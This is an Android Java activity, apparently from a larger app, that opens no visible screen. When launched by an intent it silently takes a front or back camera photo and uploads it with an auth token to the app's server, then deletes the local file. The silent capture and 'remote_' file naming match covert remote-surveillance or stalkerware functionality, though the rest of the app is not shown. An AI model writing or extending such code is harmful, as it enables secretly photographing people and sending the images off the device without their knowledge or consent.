package com.example.suma;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;

import com.google.common.util.concurrent.ListenableFuture;

import java.io.File;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CameraCaptureActivity extends AppCompatActivity {

    private static final String TAG = "CameraCaptureActivity";
    private ImageCapture imageCapture;
    private ExecutorService cameraExecutor;
    private String cameraFacing = "back";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView (Transparent)

        if (getIntent().hasExtra("camera_facing")) {
            cameraFacing = getIntent().getStringExtra("camera_facing");
        }

        if (allPermissionsGranted()) {
            startCamera();
        } else {
            finish(); // Should have permission already
        }

        cameraExecutor = Executors.newSingleThreadExecutor();
    }

    private void startCamera() {
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);

        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();

                // bind use cases
                imageCapture = new ImageCapture.Builder().build();

                CameraSelector cameraSelector = "front".equalsIgnoreCase(cameraFacing)
                        ? CameraSelector.DEFAULT_FRONT_CAMERA
                        : CameraSelector.DEFAULT_BACK_CAMERA;

                try {
                    cameraProvider.unbindAll();
                    cameraProvider.bindToLifecycle(
                            this, cameraSelector, imageCapture);

                    // Take photo immediately after bind
                    takePhoto();

                } catch (Exception exc) {
                    Log.e(TAG, "Use case binding failed", exc);
                    finish();
                }

            } catch (ExecutionException | InterruptedException e) {
                Log.e(TAG, "CameraProvider failed", e);
                finish();
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private void takePhoto() {
        if (imageCapture == null)
            return;

        File photoFile = new File(getCacheDir(), "remote_" + System.currentTimeMillis() + ".jpg");
        ImageCapture.OutputFileOptions outputOptions = new ImageCapture.OutputFileOptions.Builder(photoFile).build();

        imageCapture.takePicture(
                outputOptions,
                ContextCompat.getMainExecutor(this),
                new ImageCapture.OnImageSavedCallback() {
                    @Override
                    public void onImageSaved(@NonNull ImageCapture.OutputFileResults outputFileResults) {
                        Log.d(TAG, "Photo Capture Success: " + photoFile.getAbsolutePath());
                        uploadPhoto(photoFile);
                    }

                    @Override
                    public void onError(@NonNull ImageCaptureException exception) {
                        Log.e(TAG, "Photo Capture Failed: " + exception.getMessage(), exception);
                        finish();
                    }
                });
    }

    private void uploadPhoto(File file) {
        // Simple upload using NetworkUtils, similar to other uploads
        String token = AuthManager.getToken(this);
        NetworkUtils.uploadFile(AuthManager.getBaseUrl() + "/upload-media", file, token,
                new NetworkUtils.Callback() {
                    @Override
                    public void onSuccess(String response) {
                        Log.d(TAG, "Photo Upload Success");
                        file.delete();
                        finish(); // Done
                    }

                    @Override
                    public void onError(String error) {
                        Log.e(TAG, "Photo Upload Failed: " + error);
                        file.delete();
                        finish(); // Done
                    }
                });
    }

    private boolean allPermissionsGranted() {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (cameraExecutor != null) {
            cameraExecutor.shutdown();
        }
    }
}
